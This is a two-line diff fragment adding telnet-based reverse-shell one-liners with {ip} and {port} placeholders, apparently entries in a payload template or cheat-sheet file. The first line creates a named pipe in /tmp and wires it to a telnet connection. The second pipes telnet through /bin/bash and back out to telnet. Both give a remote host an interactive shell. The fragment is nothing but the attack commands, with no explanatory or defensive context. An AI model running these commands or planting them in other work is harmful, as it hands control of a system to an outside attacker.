@@ -1,0 +1,2 @@
+rm -f /tmp/p; mknod /tmp/p p && telnet {ip} {port} 0/tmp/p
+telnet {ip} {port} | /bin/bash | telnet  {ip} {port}
